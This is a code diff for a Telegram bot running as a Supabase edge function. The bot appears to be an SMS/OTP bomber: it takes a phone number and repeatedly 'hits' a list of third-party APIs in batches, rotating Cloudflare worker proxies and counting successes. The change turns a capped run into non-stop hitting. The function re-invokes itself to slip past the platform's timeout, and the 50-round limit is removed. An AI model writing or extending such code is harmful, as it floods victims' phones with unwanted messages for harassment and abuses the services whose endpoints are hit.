@@ -285,7 +285,25 @@ async function hitSingleApi(api: any, phone: string, workerUrl?: string | null):
   }
 }
 
-async function runHitsForPhone(chatId: number, phone: string, rounds = 1, batch = 5, delay = 2) {
+// Self-invoke to continue hitting (bypasses edge function timeout)
+async function selfContinueHits(chatId: number, phone: string, batch: number, delay: number, totalRounds: number, totalSuccess: number, totalFail: number) {
+  const supabaseUrl = Deno.env.get('SUPABASE_URL') ?? '';
+  const anonKey = Deno.env.get('SUPABASE_ANON_KEY') ?? Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? '';
+  try {
+    await fetch(`${supabaseUrl}/functions/v1/telegram-bot`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${anonKey}` },
+      body: JSON.stringify({
+        _internal_continue: true,
+        chatId, phone, batch, delay, totalRounds, totalSuccess, totalFail,
+      }),
+    });
+  } catch (e) {
+    console.error('Self-continue failed:', e);
+  }
+}
+
+async function runHitsForPhone(chatId: number, phone: string, rounds = 1, batch = 5, delay = 2, isContinuous = false, prevRounds = 0, prevSuccess = 0, prevFail = 0) {
   const apis = await getEnabledApis();
   if (apis.length === 0) {
     await sendMessage(chatId, '❌ <b>No APIs configured!</b>');
@@ -294,18 +312,41 @@ async function runHitsForPhone(chatId: number, phone: string, rounds = 1, batch 
 
   const proxyMode = await getHitProxyMode();
   const modeLabel = proxyMode === 'cloudflare' ? '☁️ CF Worker' : '⚡ Edge Function';
-  await sendMessage(chatId, `🚀 <b>Hitting ${apis.length} APIs</b>\n📱 Number: <code>${phone}</code>\n🔄 Rounds: ${rounds} | Batch: ${batch} | Delay: ${delay}s\n🌐 Mode: ${modeLabel}\n⏳ Please wait...`);
 
-  let successCount = 0, failCount = 0;
-  const results: string[] = [];
+  // First invocation: show start message
+  if (!isContinuous) {
+    await setBotState(chatId, { running: true, phone, batch, delay });
+    await sendMessage(chatId, `🚀 <b>NON-STOP HITTING STARTED!</b>\n📱 Number: <code>${phone}</code>\n📦 Batch: ${batch} | ⏱️ Delay: ${delay}s\n🌐 Mode: ${modeLabel}\n♾️ Hitting continuously until you press 🛑 STOP\n\n⏳ Running...`, {
+      inline_keyboard: [[{ text: '🛑 STOP NOW', callback_data: 'stop_hit' }]]
+    });
+  }
 
+  let successCount = prevSuccess, failCount = prevFail;
+  let roundsDone = prevRounds;
+  const MAX_ROUNDS_PER_INVOCATION = 3; // Do 3 rounds per invocation to stay within timeout
+  let roundsThisInvocation = 0;
 
-  for (let round = 1; round <= rounds; round++) {
-    if (round > 1) await new Promise(r => setTimeout(r, delay * 1000));
+  while (roundsThisInvocation < MAX_ROUNDS_PER_INVOCATION) {
+    // Check if stopped
+    const state = await getBotState(chatId);
+    if (!state?.running) {
+      // User pressed stop
+      await sendMessage(chatId, `🛑 <b>STOPPED!</b>\n\n📊 Total Rounds: <b>${roundsDone}</b>\n✅ Success: <b>${successCount}</b>\n❌ Failed: <b>${failCount}</b>\n📱 Number: <code>${phone}</code>`, {
+        inline_keyboard: [[
+          { text: '🔄 Start Again', callback_data: `hit_again:${phone}:1:${batch}:${delay}` },
+          { text: '🏠 Main Menu', callback_data: 'main_menu' },
+        ]]
+      });
+      return;
+    }
+
+    roundsDone++;
+    roundsThisInvocation++;
+
+    if (roundsThisInvocation > 1) await new Promise(r => setTimeout(r, delay * 1000));
 
     for (let i = 0; i < apis.length; i += batch) {
       const batchApis = apis.slice(i, i + batch);
-      // Use CF worker only if mode is cloudflare
       const workerUrl = proxyMode === 'cloudflare' ? await getNextWorker() : null;
 
       const batchResults = await Promise.allSettled(
@@ -315,31 +356,41 @@ async function runHitsForPhone(chatId: number, phone: string, rounds = 1, batch 
       for (const r of batchResults) {
         if (r.status === 'fulfilled') {
           const res = r.value;
-          if (res.success) { successCount++; results.push(`✅ ${res.name} → ${res.status} (${res.time}ms)`); }
-          else { failCount++; results.push(`❌ ${res.name} → ${res.status || 'ERR'} ${res.error ? `(${res.error})` : ''}`); }
+          if (res.success) successCount++;
+          else failCount++;
         } else {
           failCount++;
-          results.push(`❌ Unknown → ERR`);
         }
       }
 
-      if (i + batch < apis.length) await new Promise(r => setTimeout(r, 1000));
+      if (i + batch < apis.length) await new Promise(r => setTimeout(r, 500));
+    }
+
+    // Send periodic update every 3 rounds
+    if (roundsDone % 3 === 0) {
+      await sendMessage(chatId, `⚡ <b>Round ${roundsDone} complete</b>\n✅ ${successCount} | ❌ ${failCount}\n📱 <code>${phone}</code>\n♾️ Still running...`, {
+        inline_keyboard: [[{ text: '🛑 STOP NOW', callback_data: 'stop_hit' }]]
+      });
     }
   }
 
-  await incrementUsage(chatId);
-  await incrementGlobalHits(successCount + failCount);
-
-  const summary = `📊 <b>Results:</b>\n\n✅ Success: <b>${successCount}</b>\n❌ Failed: <b>${failCount}</b>\n📱 Number: <code>${phone}</code>\n🔄 Rounds: ${rounds}\n\n` +
-    results.slice(0, 25).join('\n') +
-    (results.length > 25 ? `\n... +${results.length - 25} more` : '');
-
-  await sendMessage(chatId, summary, {
-    inline_keyboard: [[
-      { text: '🔄 Hit Again', callback_data: `hit_again:${phone}:${rounds}:${batch}:${delay}` },
-      { text: '🏠 Main Menu', callback_data: 'main_menu' },
-    ]]
-  });
+  // Check again before self-continuing
+  const finalState = await getBotState(chatId);
+  if (finalState?.running) {
+    await incrementUsage(chatId);
+    await incrementGlobalHits(successCount - prevSuccess + failCount - prevFail);
+    // Self-invoke to continue
+    selfContinueHits(chatId, phone, batch, delay, roundsDone, successCount, failCount);
+  } else {
+    await incrementUsage(chatId);
+    await incrementGlobalHits(successCount - prevSuccess + failCount - prevFail);
+    await sendMessage(chatId, `🛑 <b>STOPPED!</b>\n\n📊 Total Rounds: <b>${roundsDone}</b>\n✅ Success: <b>${successCount}</b>\n❌ Failed: <b>${failCount}</b>\n📱 Number: <code>${phone}</code>`, {
+      inline_keyboard: [[
+        { text: '🔄 Start Again', callback_data: `hit_again:${phone}:1:${batch}:${delay}` },
+        { text: '🏠 Main Menu', callback_data: 'main_menu' },
+      ]]
+    });
+  }
 }
 
 // ===== Main Menu Keyboard =====
@@ -394,6 +445,14 @@ serve(async (req) => {
 
   try {
     const update = await req.json();
+
+    // ===== Internal self-continue for non-stop hitting =====
+    if (update._internal_continue) {
+      const { chatId, phone, batch, delay, totalRounds, totalSuccess, totalFail } = update;
+      await runHitsForPhone(chatId, phone, 1, batch, delay, true, totalRounds, totalSuccess, totalFail);
+      return new Response('OK', { headers: corsHeaders });
+    }
+
     const url = new URL(req.url);
     if (url.searchParams.get('action') === 'setwebhook') {
       const supabaseUrl = Deno.env.get('SUPABASE_URL') ?? '';
@@ -442,8 +501,9 @@ serve(async (req) => {
 
       // --- Stop ---
       if (data === 'stop_hit') {
-        await setBotState(chatId, { waiting_phone: false });
-        await editMessage(chatId, msgId, '🛑 <b>Stopped!</b>\n\n/start bhejo dobara shuru karne ke liye.');
+        await setBotState(chatId, { running: false, waiting_phone: false });
+        await answerCallbackQuery(cb.id, '🛑 Stopping...');
+        await editMessage(chatId, msgId, '🛑 <b>Stop signal sent!</b>\n\n<i>Hitting will stop after current round completes...</i>');
         return new Response('OK', { headers: corsHeaders });
       }
 
@@ -587,11 +647,10 @@ serve(async (req) => {
       if (data.startsWith('hit_again:')) {
         const parts = data.split(':');
         const phone = parts[1];
-        const rounds = parseInt(parts[2]) || 1;
         const batch = parseInt(parts[3]) || 5;
         const delay = parseInt(parts[4]) || 2;
-        await editMessage(chatId, msgId, `🔄 <b>Re-hitting...</b>`);
-        await runHitsForPhone(chatId, phone, rounds, batch, delay);
+        await editMessage(chatId, msgId, `🔄 <b>Re-starting non-stop hitting...</b>`);
+        await runHitsForPhone(chatId, phone, 1, batch, delay);
         return new Response('OK', { headers: corsHeaders });
       }
 
@@ -919,6 +978,13 @@ serve(async (req) => {
         return new Response('OK', { headers: corsHeaders });
       }
 
+      // --- /stop command ---
+      if (text === '/stop') {
+        await setBotState(chatId, { running: false, waiting_phone: false });
+        await sendMessage(chatId, '🛑 <b>Stop signal sent!</b>\n\n<i>Hitting will stop after current round...</i>');
+        return new Response('OK', { headers: corsHeaders });
+      }
+
       // ===== Phone Number Handling =====
       const state = await getBotState(chatId);
 
@@ -944,12 +1010,10 @@ serve(async (req) => {
         }
 
         const config = await getBotConfig();
-        const rounds = parseInt(parts[1]) || config.defaultRounds;
-        const batch = parseInt(parts[2]) || config.defaultBatch;
-        const delay = parseInt(parts[3]) || config.defaultDelay;
+        const batch = parseInt(parts[1]) || config.defaultBatch;
+        const delay = parseInt(parts[2]) || config.defaultDelay;
 
-        await setBotState(chatId, { waiting_phone: false });
-        await runHitsForPhone(chatId, phone, Math.min(rounds, 50), Math.min(batch, 20), Math.min(delay, 60));
+        await runHitsForPhone(chatId, phone, 1, Math.min(batch, 20), Math.min(delay, 60));
         return new Response('OK', { headers: corsHeaders });
       }
 
